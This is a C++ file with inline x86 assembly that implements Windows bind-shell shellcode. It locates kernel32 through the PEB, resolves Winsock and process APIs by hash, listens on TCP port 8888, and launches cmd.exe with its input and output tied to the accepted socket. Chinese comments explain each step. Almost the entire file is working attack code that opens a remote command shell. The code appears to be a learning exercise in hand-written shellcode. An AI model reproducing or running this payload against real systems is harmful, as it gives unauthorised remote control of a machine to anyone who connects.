#include <Windows.h>
#include <iostream>
void _declspec(naked) shellcode()
{
	//kernel32.dll 6B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00
	//ws2_32.dll 77 73 32 5F 33 32 2E 64 6C 6C 00
	// cmd.exe 63 6D 64 2E 65 78 65 00
	//LoadLibraryExA hash: 0xc0d83287 
	// WSAStartup 0x80b46a3d
	// WSASocketA 0xde78322d
	// bind 0xdda71064
	// listen 0x4bd39f0c
	// accept 0x1971eb1
	// CreateProcessA 0x6ba6bcc9
	// ExitProcess 0x4fd18963
	
	_asm
	{
		pushad
		mov ebp,esp
		sub esp, 0x30

		mov byte ptr [ebp-0x1],0x0
		mov dword ptr [ebp-0x5],0x6C6C642E
		mov dword ptr [ebp-0x9],0x32336C65
		mov dword ptr [ebp-0xD],0x6E72656B //kernel32.dll

		mov byte ptr[ebp-0xE],0x0
		mov word ptr[ebp-0x10],0x6C6C
		mov dword ptr[ebp-0x14],0x642E3233
		mov dword ptr[ebp-0x18],0x5F327377 //ws2_32.dll

		mov dword ptr[ebp-0x1C],0x657865
		mov dword ptr [ebp-0x20],0x2E646D63 //cmd.exe

		lea ebx, [ebp-0x20]
		push ebx
		lea ebx,[ebp-0x18]
		push ebx
		lea ebx,[ebp-0xD]
		push ebx
		call fun_payload
		add esp, 0x14
		add esp, 0x30
		mov esp, ebp
		popad
		ret

	//获取模块基址
	fun_GetModule :
		push ebp
		mov ebp, esp
		sub esp, 0xc
		push esi
		mov esi, dword ptr fs : [0x30]		//PEB指针
		mov esi, [esi + 0xc]	//LDR指针
		mov esi, [esi + 0x1c]	//List
		mov esi, [esi]	//list第二项 kernel32 | kernelbase   _LIST_ENTRY 结构体首位置存放下一个结构体指针
		mov esi, [esi + 0x8]	//dllbase
		mov eax, esi
		mov esp, ebp
		pop ebp
		ret

	//fun_GetProcAddress
	fun_GetProcAddress :
		push ebp
		mov ebp, esp
		sub esp, 0x10
		push esi
		push edi
		push edx
		push ebx
		push ecx
		mov edx, [ebp + 0x8] //dllbase
		mov esi, [edx + 0x3c] //lf_anew
		lea esi, [edx + esi] //NT头
		mov esi, [esi + 0x78] //导出表RVA
		lea esi, [edx + esi] //导出表VA
		mov edi, [esi + 0x1C] //EAT RVA
		lea edi, [edx + edi] //EAT VA
		mov[ebp - 0x4], edi
		mov edi, [esi + 0x20] //ENT RVA
		lea edi, [edx + edi] //ENT VA
		mov[ebp - 0x8], edi
		mov edi, [esi + 0x24] //EOT RVA
		lea edi, [edx + edi] //EOT VA
		mov[ebp - 0xC], edi
		xor ebx, ebx
		cld //将DF标志位清零(0 执行一次esi,edi加4；1 减4)
		jmp flag1
	cmpstr :
		//比较字符窜，找到相应函数地址
		inc ebx
	flag1 :
		mov esi, [ebp - 0x8]
		mov esi, [esi + ebx * 4]
		lea esi, [edx + esi] //字符串1首地址
		push esi
		call fun_getHashCode //返回值字符串hash值
		mov edi, [ebp + 0xC] //字符串2 hash值 参数2
		cmp eax,edi
		jne cmpstr
		mov esi, [ebp - 0xC]
		xor edi, edi
		mov di, [esi + 2 * ebx] //对应函数地址的索引(两个字节)
		mov esi, [ebp - 0x4]
		mov esi, [esi + edi * 4]
		lea eax, [edx + esi]
		pop ecx
		pop ebx
		pop edx
		pop edi
		pop esi
		mov esp, ebp
		pop ebp
		ret 0xC

	//fun_getHashCode
	fun_getHashCode:
		push ebp
		mov ebp, esp
		sub esp, 0x10
		push ebx
		push edx
		push esi
		mov dword ptr[ebp - 0x4], 0x0 //局部变量1
		mov esi, [ebp + 0x8] //参数1
		xor eax, eax
	flag_while :
		mov al, [esi]
		test al, al
		je flag_end
		mov ebx, [ebp - 0x4]
		shl ebx, 0x19
		mov edx, [ebp - 0x4]
		shr edx, 0x7
		or ebx, edx
		add ebx, eax
		mov[ebp - 0x4], ebx
		inc esi
		jmp flag_while
	flag_end :
		mov eax, ebx
		pop esi
		pop edx
		pop ebx
		mov esp, ebp
		pop ebp
		ret 0x4

	//func_payload
	fun_payload:
		push ebp
		mov ebp, esp
		sub esp, 0x300
		push ecx
		push ebx
		push edx
		push esi
		push edi

		//获取模块基址
		call fun_GetModule
		mov[ebp - 0x4], eax //dllbase  局部变量1

		//获取LoadLibraryExA函数地址
		push 0xc0d83287
		push eax
		call fun_GetProcAddress
		mov[ebp - 0x8], eax //LoadLibraryExA函数地址 局部变量2

		//调用LoadLibraryExA获取 kernel32.dll 模块基址
		push 0
		push 0
		push[ebp + 0x8] //参数1 kernel32.dll
		call[ebp - 0x8]
		mov[ebp - 0xC], eax //kernel32.dll基址 局部变量3

		//调用LoadLibraryExA获取 ws2_32.dll 模块基址
		push 0
		push 0
		push[ebp + 0xC] //参数2 
		call[ebp - 0x8]
		mov[ebp - 0x10], eax //ws2.32.dll 基址 局部变量4

		//获取WSAStartup函数地址 0x80b46a3d
		push 0x80b46a3d
		push[ebp - 0x10]
		call fun_GetProcAddress

		//调用WSAStartup
		lea esi, [ebp - 0x300] //WSADATA结构体
		push esi
		push 0x2020
		call eax

		//获取WSASocketA函数地址 0xde78322d
		push 0xde78322d
		push[ebp - 0x10]
		call fun_GetProcAddress

		//调用WSASocket
		push 0
		push 0
		push 0
		push 0x6
		push 0x1
		push 0x2
		call eax
		mov[ebp - 0x14], eax //Socket 局部变量5

		//获取 bind函数地址 0xdda71064
		push 0xdda71064
		push[ebp - 0x10]
		call fun_GetProcAddress

		mov word ptr [ebp - 0x300], 0x2
		mov word ptr [ebp - 0x2FE], 0XB822 //22B8 8888 端口号 大端排序
		mov dword ptr [ebp - 0x2FC], 0

		//调用 bind函数
		push 0x10
		lea esi, [ebp - 0x300]
		push esi
		push[ebp - 0x14]
		call eax

		//获取 listen 函数地址 0x4bd39f0c
		push 0x4bd39f0c
		push[ebp - 0x10]
		call fun_GetProcAddress

		//调用 listen
		push 0x7fffffff
		push[ebp - 0x14]
		call eax

		//获取 accept函数地址 0x1971eb1
		push 0x1971eb1
		push[ebp - 0x10]
		call fun_GetProcAddress

		//调用 accept
		push 0
		push 0
		push[ebp - 0x14]
		call eax
		mov [ebp-0x14],eax


		//初始化STARTUPINFOA结构体
		lea edi, [ebp - 0x90]
		xor eax, eax
		mov ecx, 0x11
		cld
		rep stosd
		mov dword ptr[ebp - 0x90], 0x44
		mov dword ptr[ebp - 0x64], 0x100
		mov esi, [ebp - 0x14]
		mov dword ptr[ebp - 0x58], esi
		mov dword ptr[ebp - 0x54], esi
		mov dword ptr[ebp - 0x50], esi

		//获取CreateProcessA函数地址 0x6ba6bcc9
		push 0x6ba6bcc9
		push[ebp - 0xC]
		call fun_GetProcAddress

		//调用CreateProcessA
		lea edx,[ebp-0x200]
		push edx
		lea esi,[ebp-0x90]
		push esi
		push 0
		push 0
		push 0
		push 1
		push 0
		push 0
		push [ebp+0x10]
		push 0
		call eax

		//获取ExitProcess函数地址 0x4fd18963


		
		pop edi
		pop esi
		pop edx
		pop ebx
		pop ecx
		mov esp, ebp
		pop ebp
		ret
	}
}

int main(void)
{
	//HMODULE hModule = LoadLibraryExA("user32.dll", 0, 0);
	printf("13");
	shellcode();
	return 0;
}